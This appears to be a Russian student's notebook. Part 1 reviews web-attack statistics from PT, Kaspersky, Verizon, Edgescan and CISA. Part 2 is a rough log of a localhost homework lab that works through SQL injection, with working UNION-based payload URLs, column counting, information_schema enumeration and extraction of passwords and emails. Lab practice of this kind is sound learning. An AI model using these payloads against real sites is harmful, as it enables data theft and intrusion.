

## Часть 1

### Ссылки на источники

#### РФ
- https://ptsecurity.com/research/analytics/results-of-incident-investigation-and-retrospective-analysis-projects-2024-2025
- https://ptsecurity.com/research/analytics/cis-cyberthreat-landscape-h2-2024-q3-2025/
- https://ptsecurity.com/research/analytics/aktual-nye-kiberugrozy-i-ii-kvartaly-2025-goda
- https://ptsecurity.com/research/analytics/itogi-proektov-po-rassledovaniyu-inczidentov-i-retrospektivnomu-analizu-2023-2024
- https://content.kaspersky-labs.com/se/media/en/business-security/enterprise/kaspersky-incident-response-report.pdf
конкретно веб атаки 
- https://rt-solar.ru/analytics/reports/5335/
- https://static.ptsecurity.com/upload/corporate/ru-ru/analytics/%D0%A3%D1%8F%D0%B7%D0%B2%D0%B8%D0%BC%D0%BE%D1%81%D1%82%D0%B8_%D0%B8_%D1%83%D0%B3%D1%80%D0%BE%D0%B7%D1%8B_%D0%B2%D0%B5%D0%B1_%D0%BF%D1%80%D0%B8%D0%BB%D0%BE%D0%B6%D0%B5%D0%BD%D0%B8%D0%B9_A4_RUS_0004_02_JUL_06_2022.pdf
#### Иностранные
- https://www.ibm.com/thought-leadership/institute-business-value/en-us/report/2025-threat-intelligence-index
- https://www.verizon.com/business/resources/reports/2024-dbir-data-breach-investigations-report.pdf
- https://www.verizon.com/business/resources/reports/2025-dbir-executive-summary.pdf
- https://cwe.mitre.org/top25/
конктретно веб
- http://verizon.com/business/resources/reports/2024-dbir-data-breach-investigations-report.pdf
- https://www.edgescan.com/wp-content/uploads/2025/04/2024-Vulnerability-Statistics-Report.pdf
- https://media.defense.gov/2024/Nov/12/2003581596/-1/-1/0/CSA-2023-TOP-ROUTINELY-EXPLOITED-VULNERABILITIES.PDF


### Доля успешных атак на организации, проведенных с помощью эксплуатации вебуязвимостей
!!! в отчетах используются разные «единицы измерения» (успешные атаки/инциденты/бричи, общий ландшафт vs. IR-кейсы vs. WAF-события), поэтому **проценты напрямую не складываются** — их корректно сравнивать только с учетом scope

Определения
**IR (Incident Response)** — это работы команды реагирования на инциденты, когда компанию уже взломали или есть сильное подозрение на компрометацию.
**Breach** — **подтвержденный инцидент**, где нарушена безопасность и это привело к **компрометации данных** (например, утечка/кража/раскрытие/несанкционированный доступ к данным).

| Источник                                                                                                                                                                                                                                                                                                                                                            | Период / выборка                                            | Что именно считали                                                                                                           | Доля                                |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- | ----------------------------------- |
| **[Positive Technologies (PT ESC IR), итоги расследований 2023–2024](https://ptsecurity.com/research/analytics/itogi-proektov-po-rassledovaniyu-inczidentov-i-retrospektivnomu-analizu-2023-2024)**                                                                                                                                                                 | IR-проекты (IV кв. 2023 — III кв. 2024)                     | «Точка входа в инфраструктуру — веб-приложения на сетевом периметре»                                                         | **44%**                             |
| **[Positive Technologies (PT ESC IR), итоги расследований 2024–2025](https://ptsecurity.com/research/analytics/results-of-incident-investigation-and-retrospective-analysis-projects-2024-2025)**                                                                                                                                                                   | IR-проекты (IV кв. 2024 — III кв. 2025), 100+ проектов      | «Самый распространенный способ первоначального доступа — эксплуатация уязвимостей в веб-приложениях, доступных из интернета» | **36%**                             |
| **[Positive Technologies, “Уязвимости и угрозы веб-приложений 2020–2021”](https://static.ptsecurity.com/upload/corporate/ru-ru/analytics/%D0%A3%D1%8F%D0%B7%D0%B2%D0%B8%D0%BC%D0%BE%D1%81%D1%82%D0%B8_%D0%B8_%D1%83%D0%B3%D1%80%D0%BE%D0%B7%D1%8B_%D0%B2%D0%B5%D0%B1_%D0%BF%D1%80%D0%B8%D0%BB%D0%BE%D0%B6%D0%B5%D0%BD%D0%B8%D0%B9_A4_RUS_0004_02_JUL_06_2022.pdf)** | Исследование/аналитика PT (про веб-атаки в целом)           | «17% от общего числа атак пришлось на эксплуатацию уязвимостей и недостатков защиты веб-приложений»                          | **17%**                             |
| **[Kaspersky Incident Response Analyst Report 2022](https://content.kaspersky-labs.com/se/media/en/business-security/enterprise/kaspersky-incident-response-report.pdf)**                                                                                                                                                                                           | IR-кейсы, фокус на ransomware/cryptors                      | Initial attack vector: **Exploit Public Facing Apps**                                                                        | **42.9% (2022)** и **53.6% (2021)** |
| **[Verizon DBIR 2024](https://www.verizon.com/business/resources/reports/2024-dbir-data-breach-investigations-report.pdf)**                                                                                                                                                                                                                                         | 30,458 incidents и 10,626 confirmed breaches (датасет 2023) | Во всех breaches доля action variety **Exploit vuln**                                                                        | **10% breaches**                    |
| **[Verizon DBIR 2024 (web-паттерн)](https://www.verizon.com/business/resources/reports/2024-dbir-data-breach-investigations-report.pdf)**                                                                                                                                                                                                                           | тот же датасет                                              | Доля breaches в паттерне **Basic Web Application Attacks**                                                                   | **чуть > 8% breaches**              |
#### Почему цифры расходятся (коротко по scope)
- [**PT ESC IR](https://ptsecurity.com/research/analytics/itogi-proektov-po-rassledovaniyu-inczidentov-i-retrospektivnomu-analizu-2023-2024) (36–44%)** — это _не весь рынок_, а выборка **успешных инцидентов**, где компании дошли до расследования (там закономерно выше доля «входа через периметр/веб»).
- **[Kaspersky IR](https://content.kaspersky-labs.com/se/media/en/business-security/enterprise/kaspersky-incident-response-report.pdf) (42.9–53.6%)** — **ransomware/cryptor-кейс-сет**, где «взлом периметра (public-facing apps)» часто ключевой.
- **[DBIR](https://www.verizon.com/business/resources/reports/2024-dbir-data-breach-investigations-report.pdf) (10% exploit vuln)** — доля **всех бричей**, где среди действий фигурирует эксплуатация уязвимости; это шире/иначе определено, чем «чисто веб-уязвимости».


### Распределение по конкретным уязвимостям
#### 2.1. Распределение _внутри веб-атак_ (по технике/классу действий) —[ Verizon DBIR](https://www.verizon.com/business/resources/reports/2024-dbir-data-breach-investigations-report.pdf) 2024

В паттерне **Basic Web Application Attacks** (чуть > 8% breaches) распределение hacking-actions такое:
- **Use of stolen credentials — 77%**
- **Brute force — 21%**
- **Exploit vuln — 13%**
**Отраслевой scope** именно этого паттерна (внутри DBIR): топ-3 вертикали — Financial & Insurance (18%), Information (14%), Professional/Scientific/Technical Services (13%).

#### 2.2. Распределение по категориям OWASP Top 10 (доля приложений с классом уязвимостей) — [Positive Technologies](https://static.ptsecurity.com/upload/corporate/ru-ru/analytics/%D0%A3%D1%8F%D0%B7%D0%B2%D0%B8%D0%BC%D0%BE%D1%81%D1%82%D0%B8_%D0%B8_%D1%83%D0%B3%D1%80%D0%BE%D0%B7%D1%8B_%D0%B2%D0%B5%D0%B1_%D0%BF%D1%80%D0%B8%D0%BB%D0%BE%D0%B6%D0%B5%D0%BD%D0%B8%D0%B9_A4_RUS_0004_02_JUL_06_2022.pdf)

По исследованным веб-приложениям (2020–2021) доли приложений с классами OWASP Top 10:
- **A01 Broken Access Control — 100%**
- **A05 Security Misconfiguration — 83%**
- **A07 Identification & Authentication Failures — 79%**
- **A04 Insecure Design — 79%**
- **A03 Injection — 66%**
- **A02 Cryptographic Failures — 48%**
- **A06 Vulnerable & Outdated Components — 34%**
- **A08 Software & Data Integrity Failures — 21%**
- **A09 Security Logging & Monitoring Failures — 17%**
- **A10 SSRF — 16%**

#### 2.3. Распределение по «техникам сложных веб-атак» (WAF/веб-события) — [Ростелеком-Солар](https://rt-solar.ru/analytics/reports/5335/)

Для «сложных веб-атак высокого уровня» в 2024 году (доля внутри этого подмножества веб-атак) лидируют:
- **Malformed Request Line — 21%**
- **DNS Rebinding — 19%**
- **HTTP Verb Tampering — 18%**
- **Denial of Service — 10%**
- **Abuse of Functionality — 8%**
- **SQL Injection — 6%**
- **Cross Site Scripting — 4%**
- **Slow Body — 3%**
- **Path Traversal — 3%**
- **Blacklisted By Host — 2%**

> Это **распределение внутри “сложных веб-атак”** (по детекциям/событиям), а не внутри «успешных компрометаций».

---

### 2.4. Распределение «по конкретным уязвимостям» на уровне CWE/типов — [Edgescan](https://www.edgescan.com/wp-content/uploads/2025/04/2024-Vulnerability-Statistics-Report.pdf) (web apps, high & critical)

Для web-приложений, среди High/Critical уязвимостей по CWE:
- **CWE-89 (SQL Injection) — 19.47%**
- **CWE-79 (XSS) — 16.03%**
- **CWE-434 (Unrestricted Upload) — 7.25%**
- **CWE-284 (Improper Access Control) — 4.39%**
- **CWE-307 (Excessive Authentication Attempts) — 4.20%**  
В том же отчете в разрезе «названий» уязвимостей (пример): **SQL Injection 19.47%, Stored XSS 10.50%, Reflected XSS 5.53%** и др.

---

## 2.5. Распределение на уровне конкретных CVE (без процентов, но как “Top exploited”) — [CISA/FBI/NSA](https://media.defense.gov/2024/Nov/12/2003581596/-1/-1/0/CSA-2023-TOP-ROUTINELY-EXPLOITED-VULNERABILITIES.PDF) (2023)

Отчет дает **ранжированный список “Top 15 routinely exploited vulnerabilities in 2023”** (это ближе всего к «распределению по конкретным уязвимостям» в CVE-терминах, но **без долей**):
- Citrix NetScaler ADC/Gateway: **CVE-2023-3519**, **CVE-2023-4966**
- Cisco IOS XE Web UI / IOS XE: **CVE-2023-20198**, **CVE-2023-20273**
- Fortinet FortiOS/FortiProxy SSL-VPN: **CVE-2023-27997**
- Progress MOVEit Transfer (SQLi): **CVE-2023-34362**
- Atlassian Confluence Data Center/Server: **CVE-2023-22515**
- Apache Log4j2: **CVE-2021-44228**
- Barracuda ESG: **CVE-2023-2868**
- Zoho ManageEngine: **CVE-2022-47966**
- PaperCut MF/NG: **CVE-2023-27350**
- Microsoft Netlogon: **CVE-2020-1472**
- JetBrains TeamCity: **CVE-2023-42793**
- Microsoft Outlook: **CVE-2023-23397**





## Часть 2
надо сначала понять какие таблицы есть чтобы получить пароли
а нет, надо сначала айдишник в писать task?id=1, о что-то появилось
попробовал после id добавить получение названия базы, дало ошибку и в ней было прописано что это MySQL
попромптил в гпт, ниче не понял
пробую еще всякие вещи вставлять в строку но все та же ошибка
в ошибке есть LIMIT значит запрос по типу SELECT _ FROM _ WHERE id = .... LIMIT 0, 1
начну просто пробовать все подряд из статьи к дз
решил просто добаваить комментарий чтобы не добавлялся LIMIT, сначала была ошибка, спросил у гпт, он сказал что в MySQL надо добавить пробел, я у меня ошибка пропала
хочу попробовать через union еще таблицы дернуть
http://localhost:8080/task/?id=1%27UNION+SELECT+username,password+FROM+users--+
дало такую ошибку The used SELECT statements have a different number of columns
из-за того что плохо знаю sql много делаю фигни
http://localhost:8080/task/?id=1%27UNION+SELECT+DATABASE()--+
не срабатываетп отому разное кол-во колонок у таблиц
http://localhost:8080/task/?id=3%27UNION+SELECT+1,1,1--+
ошибки нет, значит три колонки у первого запроса
http://localhost:8080/task/?id=2%27UNION+ALL+SELECT+*+FROM+users--+
почему то выводит все как обычно
http://localhost:8080/task/?id=2%27UNION+ALL+SELECT+*+FROM+tasks--+
опааа, выдало ошибку Table 'security.tasks' doesn't exist
значит имя базы security
попробовал через ; отправлять insert select и тп, ничего не сработало
http://localhost:8080/task/?id=3+and+password=123--+
выводит обычно
http://localhost:8080/task/?id=300%27+and+1=1+union+select+password,1,1+from+users+where+id=9+--+
вывело Ваш id:Wa spoiuuuuu  
Ваш логин:1
победа)
теперь надо понять в какие таблицы есть, название db я знаю
http://localhost:8080/task/?id=-1'+UNION+SELECT+table_name,NULL,NULL,NULL+FROM+information_schema.tables+WHERE+table_schema='security'--+
перебор таблиц, вывело ваш id: emails, значит есть таблица emails
заметил что есть отправить такой запрос http://localhost:8080/task/?id=300%27+union+select+*+from+users+--+
то выведет admin, то есть ui отображает только первую строку
дальше:
http://localhost:8080/task/?id=300%27+and+1=1+union+select+*,1+from+emails+where+id=4+--+
Ваш id:4  
Ваш логин:honey_lover@otus-lab.com
победа х2
